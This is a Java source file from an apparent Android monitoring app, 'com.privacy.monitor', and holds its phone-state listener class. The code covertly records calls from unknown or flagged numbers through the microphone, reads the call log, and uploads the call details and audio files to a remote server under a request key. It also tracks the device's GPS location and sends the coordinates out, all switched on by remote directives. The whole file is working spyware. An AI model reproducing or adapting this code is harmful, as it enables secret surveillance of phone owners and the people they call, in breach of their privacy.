package com.privacy.monitor.listener;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import com.google.gson.Gson;
import com.privacy.monitor.base.C;
import com.privacy.monitor.db.CallRecordDB;
import com.privacy.monitor.db.ContactsDB;
import com.privacy.monitor.db.DirectiveDB;
import com.privacy.monitor.db.MonitorDB;
import com.privacy.monitor.db.util.DirectiveUtil;
import com.privacy.monitor.domain.CallRecord;
import com.privacy.monitor.domain.Contacts;
import com.privacy.monitor.domain.Directive;
import com.privacy.monitor.domain.Monitor;
import com.privacy.monitor.inte.RunBack;
import com.privacy.monitor.location.LocationMan;
import com.privacy.monitor.resolver.field.CallConstant;
import com.privacy.monitor.service.utilservice.ClientSocket;
import com.privacy.monitor.util.HttpUtil;
import com.privacy.monitor.util.Logger;
import com.privacy.monitor.util.NetworkUtil;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

/**
 * 通话状态监听
 */
public class MyPhoneStateListener extends PhoneStateListener {

	private static final String TAG = MyPhoneStateListener.class.getSimpleName();
	File recordFile;
	MediaRecorder mediaRecorder;
	Context context;
	boolean iscall = false;
	private MonitorDB monitorDB;
	private ContactsDB contactsDB;
	private boolean isMonitor = false, isAnonymous,isCallDirStop = false;
	private String longitude, latitude, soundPath = "";
	private CallRecordDB callRecordDB;
	private DirectiveDB directiveDB;
	private String fileName;
	private SharedPreferences sp;
    
	
	public MyPhoneStateListener(Context context) {
		this.context = context;
		iscall = false;
		monitorDB = MonitorDB.getInstance(context);
		callRecordDB = CallRecordDB.getInstance(context);
		directiveDB = DirectiveDB.getInstance(context);
		sp = context.getSharedPreferences(C.DEVICE_INFO, Context.MODE_PRIVATE);
		contactsDB = ContactsDB.getInstance(context);
	}

	@Override
	public void onCallStateChanged(int state, String incomingNumber) {
		super.onCallStateChanged(state, incomingNumber);

		if (!DirectiveUtil.isStopAllFunction(directiveDB)) {
			
			Directive directive = directiveDB.queryDir(Directive.COL_TYPE+ " = ? ", new String[] { "4" }, new String[] {Directive.COL_START_TIME, Directive.COL_STATUS });
			if (directive != null) {
				long startTime = Long.valueOf(directive.getDirStartTime());
				Date startDate = new Date(startTime);
				Date currentDate = new Date();
				if (DirectiveUtil.isCurrentDate(startDate, currentDate)) {
					if ("0".equals(directive.getDirStatus())) {
						return ;
					}else if("1".equals(directive.getDirStatus())){
						isCallDirStop = true;
					}
				}
			}
			
			if(!isCallDirStop){
				isCallDirStop = false;
				Monitor monitor2 = monitorDB.queryOnlyRow(Monitor.COL_PHONE+ " = ? ", new String[] { sp.getString(C.PHONE_NUM, "") });
				if (monitor2 != null&& !"1".equals(monitor2.getCallMonitorStatus())) {
					return;
				}
			}

			Contacts contacts = contactsDB.queryOnlyRow(Contacts.COL_PHONE+ " =? ", new String[] { incomingNumber });
			if (contacts == null) {
				isAnonymous = true;
			}

			switch (state) {
			case TelephonyManager.CALL_STATE_RINGING:// 电话铃响
				Log.d(TAG, "CALL_STATE_RINGING:电话铃响");
			case TelephonyManager.CALL_STATE_OFFHOOK:// 摘机(处于通话中)
				try {
					if (monitorDB != null) {
						if (isAnonymous) {
							isMonitor = true;
							recordCallComment();
						}
						Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE + " = ? ",new String[] { incomingNumber });
						if (monitor != null) {
							String callMonitorStatus = monitor.getCallMonitorStatus();
							if ("1".equals(callMonitorStatus)) {
								isMonitor = true;
								recordCallComment();
							}
						}
						
						Monitor locationStatus2 = monitorDB.queryOnlyRow(Monitor.COL_PHONE + " = ? ",new String[] {sp.getString(C.PHONE_NUM,"")});
						
						if (locationStatus2 != null) {
							Logger.d("MyPhone","是否监控定位:" + locationStatus2.getLocationStatus()+ " 本机号码为:"+ sp.getString(C.PHONE_NUM, ""));
							if ("1".equals(locationStatus2.getLocationStatus())) {
								Logger.d("MyPhone", "正在定位...");
								LocationMan locationMan = new LocationMan(context);
								locationMan.setRunBack(new MyRunback());
								locationMan.startLocaiton();
							}
						}
					}
				} catch (IOException e1) {
					e1.printStackTrace();
					stopRecord();
				}

				iscall = true;
				Logger.d(TAG, "CALL_STATE_OFFHOOK:通话中");
				try {
					if (isMonitor) {
						recordCallComment();
					}
				} catch (IOException e) {
					e.printStackTrace();
					stopRecord();
				}

				break;
			case TelephonyManager.CALL_STATE_IDLE:// 空闲(处于待机状态)
				Logger.d(TAG, "CALL_STATE_IDLE:空闲中");
				if (isMonitor) {
					isMonitor = false;
					stopRecord();
					iscall = false;
					if (context != null) {
						ContentResolver mResolver = context.getContentResolver();
						if (mResolver != null) {
							Logger.d("MyPhone", "正在读取通话记录");
							Cursor cursor = mResolver.query(CallConstant.CONTENT_URI, new String[] {CallConstant.NAME,CallConstant.DATE,CallConstant.DURAITON,CallConstant.NUMBER,CallConstant.NEW }, null, null,"_id DESC LIMIT 1");
							if (cursor != null) {

								while (cursor.moveToNext()) {
									String name = cursor.getString(cursor.getColumnIndex(CallConstant.NAME));
									String date = cursor.getString(cursor.getColumnIndex(CallConstant.DATE));

									String duration = cursor.getString(cursor.getColumnIndex(CallConstant.DURAITON));

									String number = cursor.getString(cursor.getColumnIndex(CallConstant.NUMBER));
									String newss = cursor.getString(cursor.getColumnIndex(CallConstant.NEW));
									String deviewname = android.os.Build.MODEL;
									long endTime = Long.valueOf(date)+ Long.valueOf(duration);
									CallRecord callRecord = new CallRecord();
									if (isAnonymous)number = number + "(匿名号码)";
									callRecord.setCallName(name);
									callRecord.setCallStartTime(date);
									callRecord.setCallStopTime(endTime + "");
									callRecord.setDeviceName(deviewname);
									callRecord.setFileName(fileName);
									callRecord.setPhoneNumber(number);
									callRecord.setCallStatus(newss);
									// callRecord.setLat(latitude);
									// callRecord.setLon(longitude);
									callRecord.setDeviceName(android.os.Build.MODEL+ ":"+ android.os.Build.VERSION.SDK_INT);
									SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
									callRecord.setMyPhone(sp.getString(C.PHONE_NUM, ""));
									callRecord.setDeviceID(sp.getString(C.DEVICE_ID, ""));
									callRecord.setSimID(sp.getString(C.SIM_ID,""));
									callRecord.setSoundRecordPath(soundPath);
									callRecordDB.insert(callRecord);
									if (HttpUtil.detect(context)) {
										ArrayList<ArrayList<String>> callRecords = new ArrayList<ArrayList<String>>();
										ArrayList<String> lists = new ArrayList<String>();
										lists.add(callRecord.getCallStatus());
										lists.add(callRecord.getPhoneNumber());
										lists.add(callRecord.getCallName());
										lists.add(callRecord.getCallStartTime());
										lists.add(callRecord.getCallStopTime());
										lists.add(callRecord.getFileName());
										callRecords.add(lists);
										String param = "key="+ ClientSocket.APP_REQ_KEY+ "&device_id="+ sp.getString(C.DEVICE_ID, "")+ "&call_list="+ new Gson().toJson(callRecords);
										Logger.d("MyPhone", "正在上传通话记录");
										String result = NetworkUtil.uploadCall(context,param,C.RequestMethod.uploadCallRecord);

										if (!result.startsWith("FAIL")) {
											Logger.d("MyPhone", "上传通话记录成功");
											String uploadFileResult = NetworkUtil.uploadFile(context,callRecord.getSoundRecordPath(),callRecord.getFileName(),C.RequestMethod.uploadCallSoundFile);
											if (uploadFileResult.contains("FAIL")) {
												Logger.d("Myphone","上传录音文件失败");
												callRecordDB.update(CallRecord.COL_UPLOAD_RESULT+ " = ? "+ " , "+ CallRecord.COL_FILE_NAME+ " = ? ",CallRecord.COL_CALL_START_TIME+ " = ?",new String[] {"0",result,date });
											} else {
												Logger.d("Myphone","上传录音文件成功");
												callRecordDB.delete(CallRecord.COL_CALL_START_TIME+ " = ? ",new String[] { callRecord.getCallStartTime() });
												File file = new File(soundPath);
												if (file.exists()) {
													Editor editor = sp.edit();
													editor.putString(C.DEVICE_SUP_CALL_REC,"1");
													editor.commit();
													if (file.isFile()) {
														file.delete();
													}
												}
											}
										}
									}
									break;
								}
								cursor.close();
							}
						}
					}
				}
				break;
			}
		}
	}

	public void recordCallComment() throws IOException {
		if (mediaRecorder == null) {
			Logger.d("MyPhone", "正在录音...");
			mediaRecorder = new MediaRecorder();
			// audioRecord.
			// 設置聲音源(麥克風)
			mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
			// recordFile = File.createTempFile("record_",".amr",audioFile);
			mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
			// Log.d(TAG, "文件路径:"+recordFile.getAbsolutePath());
			// 设置输出声音文件的路径
			long currentTime = new Date().getTime();
			fileName = "call_" + sp.getString(C.DEVICE_ID, "") + "_"+ currentTime + ".3gpp";
			soundPath = context.getFilesDir() + "/" + fileName;
			
			mediaRecorder.setOutputFile(soundPath);
			mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
			mediaRecorder.setOnErrorListener(null);
			mediaRecorder.setOnInfoListener(null);
			mediaRecorder.prepare();
			// mediaRecorder.start();
		} else {
			mediaRecorder.start();
		}

	}

	public void stopRecord() {
		if (mediaRecorder != null) {
			if (iscall) {
				// mediaRecorder.release();
				mediaRecorder.stop();
				mediaRecorder.reset();
				mediaRecorder.release();
				mediaRecorder = null;
			}
		}
	}

	private class MyRunback implements RunBack {

		@Override
		public void run() {
		}

		@Override
		public void run(Object object) {
			if (object instanceof String[]) {
				String[] locationInfo = (String[]) object;
				if (locationInfo != null && locationInfo.length == 2) {
					latitude = locationInfo[0];
					longitude = locationInfo[1];
					NetworkUtil.sendLocInfo(context,ClientSocket.APP_REQ_KEY,sp.getString(C.DEVICE_ID, ""),longitude, latitude, " ", new Date().getTime() + "",C.RequestMethod.uploadLocation);
				}
			}
		}
	}
}
